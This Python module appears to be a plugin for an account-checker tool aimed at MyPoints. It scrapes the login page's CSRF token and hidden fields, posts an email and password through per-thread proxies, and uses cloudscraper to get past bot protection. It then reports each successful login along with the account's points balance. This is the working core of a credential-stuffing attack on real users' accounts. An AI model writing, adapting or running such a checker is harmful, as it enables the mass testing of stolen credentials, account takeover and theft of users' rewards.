"""
Checker for MyPoints (www.mypoints.com)
Uses the /secure/login endpoint with multipart form data.
"""
import re
import threading
from typing import Tuple
from urllib.parse import urljoin

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

BASE_URL = "https://www.mypoints.com"
LOGIN_PAGE = BASE_URL + "/login"
API_BASE = "https://api.mypoints.com"
LOGIN_URL = API_BASE + "/secure/login"
TIMEOUT = 20

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    if HAS_CLOUDSCRAPER:
        session = cloudscraper.create_scraper()
    else:
        import requests
        session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/javascript, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": BASE_URL,
        "Referer": LOGIN_PAGE,
    })

    try:
        # Step 1: GET login page to extract CSRF token and hidden fields
        resp = session.get(LOGIN_PAGE, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        html = resp.text
        # Find the form – likely action="/secure/login" or similar
        form_action = LOGIN_URL
        match = re.search(r'<form[^>]*action="([^"]+)"', html, re.I)
        if match:
            action = match.group(1)
            if action.startswith("/"):
                form_action = API_BASE + action
            elif action.startswith("http"):
                form_action = action

        # Extract hidden inputs
        payload = {}
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"'
        for name, value in re.findall(hidden_pattern, html, re.I):
            payload[name] = value

        # Also look for CSRF token in meta or script
        token_match = re.search(r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"', html, re.I)
        if token_match:
            payload["_token"] = token_match.group(1)
        else:
            # Try common names
            for key in ["csrf_token", "authenticity_token", "csrf"]:
                if key in payload:
                    break
            else:
                # If no token found, we still proceed (some sites don't use one)
                pass

        # Add email and password – field names might be "email", "username", or "login"
        # Look at the login form to get exact field names
        email_field = None
        password_field = None
        for inp in re.findall(r'<input[^>]*name="([^"]+)"[^>]*type="([^"]+)"', html, re.I):
            name, typ = inp
            if typ in ["email", "text"] and ("email" in name.lower() or "user" in name.lower()):
                email_field = name
            elif typ == "password" and "password" in name.lower():
                password_field = name

        if not email_field:
            email_field = "email"  # fallback
        if not password_field:
            password_field = "password"  # fallback

        payload[email_field] = email
        payload[password_field] = password

        # Also add any required fixed fields like "_ajax", "pathName" etc.
        # Often the form includes a hidden "_ajax" field
        if "_ajax" not in payload:
            payload["_ajax"] = "1"  # many MyPoints requests use this

        # Step 2: POST to /secure/login
        # The request uses multipart/form-data; requests handles that when we pass data.
        post_resp = session.post(form_action, data=payload, allow_redirects=False, timeout=TIMEOUT)

        # Step 3: Determine success
        if post_resp.status_code in (301, 302):
            location = post_resp.headers.get("Location", "").lower()
            # After success, redirects to home page or dashboard
            if "login" not in location and "signin" not in location:
                return True, "Login successful (redirect)"
            else:
                return False, "Login failed (redirected to login)"

        # If status 200, inspect JSON response
        if post_resp.status_code == 200:
            try:
                data = post_resp.json()
            except:
                return False, f"Invalid JSON response: {post_resp.text[:100]}"

            # Look for success indicator
            # Successful login might return {"status":"success"} or {"success":true}
            if data.get("status") == "success" or data.get("success") is True:
                return True, "Login successful (JSON)"
            # If there's an error message
            if "error" in data:
                return False, f"Login failed: {data['error']}"
            if "message" in data and "invalid" in data["message"].lower():
                return False, f"Login failed: {data['message']}"

            # Sometimes the response is empty on success (e.g., 200 with no body)
            # If no error and we got a 200, assume success (but check if we are logged in)
            # We can also call the member-status endpoint to verify
            # Let's check the member status API to be sure
            status_resp = session.get(API_BASE + "/?cmd=mp-gn-member-status", timeout=TIMEOUT)
            if status_resp.status_code == 200:
                try:
                    status_data = status_resp.json()
                    if status_data.get("member", {}).get("loggedIn"):
                        points = status_data["member"].get("points", "N/A")
                        return True, f"Login successful. Points: {points}"
                except:
                    pass
            # If we still don't know, treat as failure
            return False, "Login failed – unknown response"

        return False, f"Login failed (HTTP {post_resp.status_code})"

    except Exception as e:
        return False, f"Request error: {str(e)}"